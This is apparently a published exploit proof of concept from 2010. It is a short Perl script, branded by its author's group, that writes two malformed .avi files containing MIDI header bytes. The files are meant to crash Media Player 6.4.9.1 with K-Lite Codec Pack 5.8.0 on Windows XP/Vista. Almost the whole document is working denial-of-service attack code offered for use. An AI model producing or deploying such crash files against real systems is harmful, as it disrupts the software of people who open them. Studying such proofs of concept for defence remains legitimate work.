# Exploit Title: Media Player V6.4.9.1 with K-Lite Codec Pack DoS/Crash (.avi file)
# Date: 14/3/2010
# Author: En|gma7
# Software Link: http://www.free-codecs.com/K_lite_codec_pack_download.htm
# Version: Media Player V6.4.9.1 with K-Lite Codec Pack 5.8.0
# Tested on: WinXP/Vista
# CVE : [if exists]
# Code :

#!/usr/bin/perl

# dos.avi work on windows XP with all SP
#crash.avi work on WinXP/Vista

print "
[~] Media Player V6.4.9.1 with K-Lite Codec Pack 5.8.0 DoS/Crash (.avi file)
[~] EN|GMA7 Team ~
[~] By Zaid
[~] www.enigma7.net<http://www.enigma7.net><http://www.enigma7.net>
";


$bf = "\x4D\x54\x68\x64\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00";
$crash = "\x4D\x54\x68\x64\x00\x00\x00\x06";

open(file, "> dos.avi");
print (file $bf);
open(file, "> crash.avi");
print (file $crash);
print "\n\n[+] Done!\n
[+] dos.avi and crash.avi created..\n
[+] Z-at-Enigma7.net\n";